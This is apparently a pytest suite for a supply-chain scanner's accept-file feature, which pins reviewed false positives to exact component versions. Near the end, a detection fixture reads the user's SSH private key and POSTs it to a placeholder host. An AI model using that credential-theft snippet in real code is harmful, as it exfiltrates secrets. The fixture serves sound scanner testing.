"""The accept file (--accept / --write-accept) of `guard` and `inventory`.

A reviewed false positive on an installed component used to block a scheduled sweep every day,
and the only way out was turning the check off. An accept entry names one component at one exact
version and the fingerprints of the findings accepted; any update, or any other finding, is judged
as usual. Every test builds a fake home in tmp_path (see test_inventory_extensions). The decode-and-
eval line is an inert detection fixture: a string written to a temp file for the scanner to flag,
never executed.
"""

from __future__ import annotations

import json
import shutil
from datetime import date, timedelta
from pathlib import Path

import pytest

from skilltotal.accept import (
    ACCEPT_FORMAT,
    AcceptError,
    AcceptList,
    load_accept,
    source_key,
)
from skilltotal.cli import EXIT_ERROR, EXIT_FAIL_ON_HIGH, EXIT_OK, main
from skilltotal.inventory import discover
from tests.test_inventory_extensions import CLEAN_JS, PICKLE_PY, _extension, _manifest

# Decode-and-execute -> ST-OBF-DECODE-EXEC, a malicious indicator.
DECODE_EVAL_JS = CLEAN_JS + 'eval(atob("Y29uc29sZS5sb2coMSk="));\n'
OTHER_DECODE_EVAL_JS = 'eval(atob("Zm9vYmFy"));\n'
FP = "0123456789abcdef"


@pytest.fixture
def fake_home(tmp_path: Path, monkeypatch) -> Path:
    """A home of its own for discovery, as in test_inventory_extensions."""
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setattr("skilltotal.inventory.discover",
                        lambda project=None: discover(home=home, project=project, environ={}))
    return home


def _folder(home: Path) -> Path:
    return home / ".vscode" / "extensions"


def _install(home: Path, version: str = "1.0.0", files: dict[str, str] | None = None) -> Path:
    return _extension(_folder(home), f"acme.quillwidget-{version}", _manifest(version=version),
                      files or {"extension.js": DECODE_EVAL_JS})


def _update(home: Path, old: str, new: str, files: dict[str, str] | None = None) -> None:
    shutil.rmtree(_folder(home) / f"acme.quillwidget-{old}")
    _install(home, new, files)


def _fill(path: Path, reason: str = "inert sample the extension ships for its own tests",
          **extra) -> dict:
    """What the reviewer does with a --write-accept file: write in the reasons."""
    doc = json.loads(path.read_text(encoding="utf-8"))
    for entry in doc["accepted"]:
        entry["reason"] = reason
        entry.update(extra)
    path.write_text(json.dumps(doc), encoding="utf-8")
    return doc


def _accept_file(tmp_path: Path, home: Path, capsys, **extra) -> Path:
    """An accept file for the installed extension, written by --write-accept and reviewed."""
    path = tmp_path / "accept.json"
    assert main(["guard", "--installed", "--write-accept", str(path)]) == EXIT_OK
    capsys.readouterr()
    _fill(path, **extra)
    return path


# --- Installed components ------------------------------------------------------------------------


def test_accepted_malicious_false_positive_is_allowed_shown_and_warned(fake_home, tmp_path,
                                                                     capsys):
    _install(fake_home)
    assert main(["guard", "--installed"]) == EXIT_FAIL_ON_HIGH
    capsys.readouterr()

    path = tmp_path / "accept.json"
    assert main(["guard", "--installed", "--write-accept", str(path)]) == EXIT_OK
    err = capsys.readouterr().err
    assert "empty \"reason\"" in err
    (entry,) = json.loads(path.read_text(encoding="utf-8"))["accepted"]
    assert entry["component"] == "VS Code|editor_extension|acme.quillwidget"
    assert entry["version"] == "1.0.0"
    assert entry["rules"] == ["ST-OBF-DECODE-EXEC"]
    assert entry["reason"] == ""
    assert all(len(fp) == 16 for fp in entry["findings"])

    # Not usable until a reviewer writes in the reason.
    assert main(["guard", "--installed", "--accept", str(path)]) == EXIT_ERROR
    assert "\"reason\" is empty" in capsys.readouterr().err

    _fill(path, expires=(date.today() + timedelta(days=30)).isoformat(), accepted_by="sec-team")
    assert main(["guard", "--installed", "--accept", str(path)]) == EXIT_OK
    captured = capsys.readouterr()
    assert "[ACCEPTED] acme.quillwidget@1.0.0 (VS Code, editor_extension)" in captured.out
    assert "ST-OBF-DECODE-EXEC (1 occurrence(s)): inert sample" in captured.out
    assert "1 component(s) with findings the accept file accepts." in captured.out
    # The hidden malicious indicator is named on stderr on every run, for a log or a SIEM.
    assert "hides malicious indicator(s) ST-OBF-DECODE-EXEC in acme.quillwidget@1.0.0" in \
        captured.err

    # The JSON output carries the acceptance.
    assert main(["guard", "--installed", "--json", "--accept", str(path)]) == EXIT_OK
    (item,) = json.loads(capsys.readouterr().out)
    assert item["decision"] == "allow"
    assert item["accepted"]["rules"] == ["ST-OBF-DECODE-EXEC"]
    assert item["accepted"]["count"] == 1
    assert item["accepted"]["accepted_by"] == "sec-team"
    assert item["accepted"]["expires"] == (date.today() + timedelta(days=30)).isoformat()


def test_an_update_of_an_accepted_component_is_judged_afresh(fake_home, tmp_path, capsys):
    _install(fake_home)
    path = _accept_file(tmp_path, fake_home, capsys)
    _update(fake_home, "1.0.0", "1.1.0")  # the same finding, in a new version
    assert main(["guard", "--installed", "--accept", str(path)]) == EXIT_FAIL_ON_HIGH
    captured = capsys.readouterr()
    assert "[BLOCK] acme.quillwidget@1.1.0" in captured.out
    assert "ACCEPTED" not in captured.out
    assert "stale" in captured.err and "acme.quillwidget@1.0.0" in captured.err


def test_a_new_finding_in_the_accepted_version_blocks(fake_home, tmp_path, capsys):
    root = _install(fake_home)
    path = _accept_file(tmp_path, fake_home, capsys)
    (root / "other.js").write_text(OTHER_DECODE_EVAL_JS, encoding="utf-8")
    assert main(["guard", "--installed", "--json", "--accept", str(path)]) == EXIT_FAIL_ON_HIGH
    (item,) = json.loads(capsys.readouterr().out)
    assert item["decision"] == "block"
    assert item["accepted"]["count"] == 1  # the reviewed one is still accepted, and shown


def test_an_expired_entry_does_not_apply_and_is_named(fake_home, tmp_path, capsys):
    _install(fake_home)
    yesterday = (date.today() - timedelta(days=1)).isoformat()
    path = _accept_file(tmp_path, fake_home, capsys, expires=yesterday)
    assert main(["guard", "--installed", "--accept", str(path)]) == EXIT_FAIL_ON_HIGH
    err = capsys.readouterr().err
    assert "expired entr(ies) no longer apply" in err
    assert f"(expired {yesterday})" in err


def test_an_entry_for_nothing_installed_is_reported_stale(fake_home, tmp_path, capsys):
    _extension(_folder(fake_home), "acme.clean-1.0.0", _manifest("clean"))
    path = tmp_path / "accept.json"
    path.write_text(json.dumps({"format": ACCEPT_FORMAT, "version": 1, "accepted": [
        {"component": "VS Code|editor_extension|acme.gone", "version": "2.0.0",
         "findings": [FP], "reason": "reviewed"}]}), encoding="utf-8")
    assert main(["guard", "--installed", "--accept", str(path)]) == EXIT_OK
    err = capsys.readouterr().err
    assert "1 entr(ies) match no component scanned at their version (stale)" in err
    assert "VS Code|editor_extension|acme.gone@2.0.0" in err


def _doc(**entry) -> str:
    base = {"component": "c", "version": "1.0.0", "findings": [FP], "reason": "reviewed"}
    base.update(entry)
    return json.dumps({"format": ACCEPT_FORMAT, "version": 1, "accepted": [base]})


INVALID = {
    "not json": "{ not json",
    "not an object": "[]",
    "wrong format": json.dumps({"format": "skilltotal-inventory-state", "version": 1}),
    "wrong version": json.dumps({"format": ACCEPT_FORMAT, "version": 2, "accepted": []}),
    "entries not a list": json.dumps({"format": ACCEPT_FORMAT, "version": 1, "accepted": {}}),
    "entry not an object": json.dumps({"format": ACCEPT_FORMAT, "version": 1,
                                       "accepted": ["x"]}),
    "no component": _doc(component=""),
    "no version": json.dumps({"format": ACCEPT_FORMAT, "version": 1, "accepted": [
        {"component": "c", "findings": [FP], "reason": "r"}]}),
    "no reason": json.dumps({"format": ACCEPT_FORMAT, "version": 1, "accepted": [
        {"component": "c", "version": "1", "findings": [FP]}]}),
    "empty reason": _doc(reason="  "),
    "no findings": _doc(findings=[]),
    "short fingerprint": _doc(findings=["abc123"]),
    "upper-case fingerprint": _doc(findings=[FP.upper()]),
    "rules not a list": _doc(rules="ST-X"),
    "bad date shape": _doc(expires="31.12.2026"),
    "no such date": _doc(expires="2026-02-30"),
    "misspelt key": _doc(expire="2026-12-31"),
}


@pytest.mark.parametrize("text", INVALID.values(), ids=INVALID.keys())
def test_an_invalid_accept_file_is_refused(text, fake_home, tmp_path, capsys):
    with pytest.raises(AcceptError):
        load_accept(text)
    path = tmp_path / "accept.json"
    path.write_text(text, encoding="utf-8")
    _install(fake_home)
    for argv in (["guard", "--installed"], ["inventory"], ["guard", str(tmp_path / "x")]):
        assert main([*argv, "--accept", str(path)]) == EXIT_ERROR
        assert "cannot use the accept file" in capsys.readouterr().err


def test_a_missing_accept_file_is_refused(tmp_path, capsys):
    assert main(["guard", str(tmp_path), "--accept", str(tmp_path / "none.json")]) == EXIT_ERROR
    assert "no such file" in capsys.readouterr().err


def test_write_accept_never_overwrites_another_file(fake_home, tmp_path, capsys):
    _install(fake_home)
    other = tmp_path / "notes.json"
    other.write_text('{"keep": true}', encoding="utf-8")
    assert main(["guard", "--installed", "--write-accept", str(other)]) == EXIT_ERROR
    assert "not overwritten" in capsys.readouterr().err
    assert other.read_text(encoding="utf-8") == '{"keep": true}'


def test_write_accept_keeps_reviewed_entries(fake_home, tmp_path, capsys):
    _install(fake_home)
    path = _accept_file(tmp_path, fake_home, capsys)
    reviewed = json.loads(path.read_text(encoding="utf-8"))["accepted"]
    # Accepted already: nothing new to write.
    assert main(["guard", "--installed", "--accept", str(path), "--write-accept",
                 str(path)]) == EXIT_OK
    assert "Nothing new to accept" in capsys.readouterr().err
    _update(fake_home, "1.0.0", "1.1.0")
    assert main(["guard", "--installed", "--accept", str(path), "--write-accept",
                 str(path)]) == EXIT_OK
    entries = json.loads(path.read_text(encoding="utf-8"))["accepted"]
    assert entries[0] == reviewed[0]
    assert (entries[1]["version"], entries[1]["reason"]) == ("1.1.0", "")


def test_no_scan_takes_no_accept_file(tmp_path, capsys):
    assert main(["inventory", "--no-scan", "--accept", str(tmp_path / "a.json")]) == EXIT_ERROR
    assert "need a scan" in capsys.readouterr().err


# --- inventory: text, JSON and AI-BOM ------------------------------------------------------------


def test_inventory_shows_the_acceptance_in_text_json_and_sbom(fake_home, tmp_path, capsys):
    _install(fake_home)
    path = tmp_path / "accept.json"
    assert main(["inventory", "--write-accept", str(path)]) == EXIT_OK
    capsys.readouterr()
    _fill(path, expires="2999-01-01")

    assert main(["inventory", "--accept", str(path)]) == EXIT_OK
    out = capsys.readouterr().out
    assert "acme.quillwidget@1.0.0: ACCEPTED until 2999-01-01: ST-OBF-DECODE-EXEC" in out

    assert main(["inventory", "--json", "--accept", str(path)]) == EXIT_OK
    (item,) = json.loads(capsys.readouterr().out)
    assert item["guard"] == "allow"
    assert item["has_malicious_indicators"] is False
    assert item["accepted"] == {"rules": ["ST-OBF-DECODE-EXEC"], "count": 1,
                                "reason": "inert sample the extension ships for its own tests",
                                "expires": "2999-01-01"}

    assert main(["inventory", "--sbom", "--accept", str(path)]) == EXIT_OK
    (component,) = json.loads(capsys.readouterr().out)["components"]
    props = {p["name"]: p["value"] for p in component["properties"]}
    assert props["skilltotal:accepted"].startswith("ST-OBF-DECODE-EXEC (1) until 2999-01-01: ")


# --- Drift (--state) -----------------------------------------------------------------------------


def test_accept_leaves_the_state_as_a_run_without_it_would(fake_home, tmp_path, capsys):
    state = tmp_path / "state.json"
    _install(fake_home, files={"extension.js": CLEAN_JS})
    assert main(["guard", "--installed", "--state", str(state)]) == EXIT_OK
    before_update = state.read_text(encoding="utf-8")

    # An update adds a high risky construct: drift, which blocks.
    _update(fake_home, "1.0.0", "1.1.0", {"extension.js": CLEAN_JS, "quill.py": PICKLE_PY})
    assert main(["guard", "--installed", "--state", str(state)]) == EXIT_FAIL_ON_HIGH
    without_accept = json.loads(state.read_text(encoding="utf-8"))
    capsys.readouterr()

    # Reviewed and accepted at 1.1.0: no drift and no block, and the state records the accepted
    # finding all the same.
    path = tmp_path / "accept.json"
    state.write_text(before_update, encoding="utf-8")
    assert main(["guard", "--installed", "--state", str(state), "--write-accept",
                 str(path)]) == EXIT_OK
    capsys.readouterr()
    _fill(path)
    state.write_text(before_update, encoding="utf-8")
    assert main(["guard", "--installed", "--state", str(state), "--json", "--accept",
                 str(path)]) == EXIT_OK
    (item,) = json.loads(capsys.readouterr().out)
    assert "drift" not in item
    assert item["accepted"]["rules"] == ["ST-DESERIALIZE-PY"]
    assert json.loads(state.read_text(encoding="utf-8")) == without_accept


# --- guard <source> ------------------------------------------------------------------------------


def _package(root: Path, version: str) -> Path:
    root.mkdir(exist_ok=True)
    (root / "package.json").write_text(json.dumps({"name": "quill-mcp", "version": version,
                                                   "main": "index.js"}), encoding="utf-8")
    (root / "index.js").write_text(DECODE_EVAL_JS, encoding="utf-8")
    return root


def test_guard_source_accepts_by_source_and_version(tmp_path, capsys):
    src = str(_package(tmp_path / "quill", "1.0.0"))
    assert main(["guard", src]) == EXIT_FAIL_ON_HIGH
    capsys.readouterr()
    path = tmp_path / "accept.json"
    assert main(["guard", src, "--write-accept", str(path)]) == EXIT_OK
    capsys.readouterr()
    (entry,) = _fill(path)["accepted"]
    assert (entry["component"], entry["version"]) == (src, "1.0.0")

    assert main(["guard", src, "--accept", str(path)]) == EXIT_OK
    captured = capsys.readouterr()
    assert "Accepted  : ACCEPTED: ST-OBF-DECODE-EXEC (1 occurrence(s))" in captured.out
    assert "Decision  : ALLOW" in captured.out
    assert "hides malicious indicator(s) ST-OBF-DECODE-EXEC" in captured.err

    assert main(["guard", src, "--json", "--accept", str(path)]) == EXIT_OK
    out = json.loads(capsys.readouterr().out)
    assert out["decision"] == "allow"
    assert out["accepted"]["rules"] == ["ST-OBF-DECODE-EXEC"]

    # A new version is only known once scanned: it is scanned again without the old entry.
    _package(tmp_path / "quill", "1.0.1")
    assert main(["guard", src, "--accept", str(path)]) == EXIT_FAIL_ON_HIGH
    captured = capsys.readouterr()
    assert "Decision  : BLOCK" in captured.out
    assert "stale" in captured.err and f"{src}@1.0.0" in captured.err


# --- Synthesized findings ------------------------------------------------------------------------


def _loddash(tmp_path: Path) -> Path:
    """A package named one edit from lodash: ST-TYPOSQUAT, synthesized from its name."""
    pkg = tmp_path / "loddash"
    pkg.mkdir()
    (pkg / "package.json").write_text('{"name": "loddash", "version": "1.0.0"}',
                                      encoding="utf-8")
    (pkg / "index.js").write_text("module.exports = {}\n", encoding="utf-8")
    return pkg


def test_a_baseline_suppresses_a_typosquat_fingerprint(tmp_path, capsys):
    pkg = _loddash(tmp_path)
    baseline = tmp_path / "baseline.json"
    assert main(["scan", str(pkg), "--no-config", "--write-baseline", str(baseline)]) == EXIT_OK
    capsys.readouterr()
    assert main(["scan", str(pkg), "--no-config", "--json", "--baseline", str(baseline)]) == \
        EXIT_OK
    report = json.loads(capsys.readouterr().out)
    assert "ST-TYPOSQUAT" not in {f["id"] for f in report["findings"]}
    assert report["metadata"]["baseline_suppressed_count"] == 1
    assert report["metadata"]["suppressed_count"] == 1


def test_accept_on_an_installed_mcp_server_with_a_typosquat_false_positive(fake_home, tmp_path,
                                                                         capsys):
    pkg = _loddash(tmp_path)
    (fake_home / ".claude.json").write_text(json.dumps({"mcpServers": {"loddash": {
        "command": "node", "args": [str(pkg / "index.js")]}}}), encoding="utf-8")
    assert main(["guard", "--installed"]) == EXIT_FAIL_ON_HIGH
    assert "possible typosquatting" in capsys.readouterr().out

    path = tmp_path / "accept.json"
    assert main(["guard", "--installed", "--write-accept", str(path)]) == EXIT_OK
    capsys.readouterr()
    (entry,) = _fill(path, reason="our own fork, published under this name on purpose")["accepted"]
    assert (entry["component"], entry["version"], entry["rules"]) == (
        "Claude Code|mcp_server|loddash", "1.0.0", ["ST-TYPOSQUAT"])

    assert main(["guard", "--installed", "--accept", str(path)]) == EXIT_OK
    out = capsys.readouterr().out
    assert "[ACCEPTED] loddash (Claude Code, mcp_server)" in out
    assert "ST-TYPOSQUAT (1 occurrence(s)): our own fork" in out


_STEAL_JS = ("const fs = require('fs');\n"
             "const k = fs.readFileSync(`${process.env.HOME}/.ssh/id_rsa`, 'utf8');\n"
             "fetch('https://c.invalid/k', {method: 'POST', body: k});\n")


def test_a_combination_follows_its_inputs_not_its_own_fingerprints(tmp_path):
    from skilltotal import engine
    from skilltotal.baseline import finding_fingerprints

    root = tmp_path / "comp"
    (root / "src").mkdir(parents=True)
    (root / "src" / "x.js").write_text(_STEAL_JS, encoding="utf-8")
    report = engine.analyze(str(root))
    combo = next(f for f in report.findings if f.id == "ST-COMBO-EXFIL")

    # Its own fingerprints listed, its inputs not: it still fires.
    again = engine.analyze(str(root), suppress=set(finding_fingerprints(combo)))
    assert "ST-COMBO-EXFIL" in {f.id for f in again.findings}

    # Its inputs accepted: it is gone.
    inputs = {fp for f in report.findings if f.id != "ST-COMBO-EXFIL"
              for fp in finding_fingerprints(f)}
    assert "ST-COMBO-EXFIL" not in {f.id for f in engine.analyze(str(root),
                                                                  suppress=inputs).findings}


def test_source_key_drops_the_version():
    assert source_key("npm:Quill-MCP@1.2.3") == "npm:quill-mcp"
    assert source_key(" pypi:Quill_MCP==1.0 ") == "pypi:quill-mcp"
    assert source_key("https://github.com/acme/quill") == "https://github.com/acme/quill"


def test_matching_is_exact_on_component_and_version():
    (entry,) = load_accept(_doc(component="k", version="1.0.0"))
    accept = AcceptList([entry], date.today())
    assert accept.candidates("k", None) == {FP}
    assert accept.candidates("k", "1.0.1") == set()
    assert accept.matching("k", "1.0.1") == []
    assert accept.stale() == [entry]
    assert accept.matching("k", "1.0.0") == [entry]
    assert accept.stale() == []
